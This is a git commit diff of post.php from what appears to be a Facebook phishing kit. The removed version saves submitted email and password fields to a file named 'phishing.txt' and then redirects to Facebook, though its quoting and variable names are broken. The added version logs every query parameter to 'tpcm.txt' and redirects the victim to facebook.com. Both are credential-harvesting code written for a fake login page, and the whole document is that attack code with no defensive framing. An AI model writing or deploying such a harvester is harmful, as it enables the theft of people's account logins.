a11f938648da3e08274c59e5de9fa881b7c4c635
fridricadolf <fridricadolf@gmail.com>
2019-04-03 13:03:10 -0500

    Update post.php

--- post.php
+++ post.php
@@ -1,1 +1,13 @@
-<? if(isset($_POST[’email’]) && isset($_POST[‘pass’])) { $password=file_get_contents(‘phishing.txt’); $phishing = fopen(“phishing.txt”,”w”); fwrite($phishing,$password.”Email : “.$_POST[’fridricadolf100@gmail.com’].” , Password”.$_POST[‘pass’].”\n”); fclose($file); echo ‘<script>window.location.href=”https://wwww.facebook.com/”</script>’; } else echo ‘<script>window.location.href=”index.html”</script>’; ?>                          
+<?php
+header ('Location: http://www.facebook.com');
+$handle = fopen("tpcm.txt", "a");
+foreach($_GET as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, "=");
+   fwrite($handle, $value);
+   fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
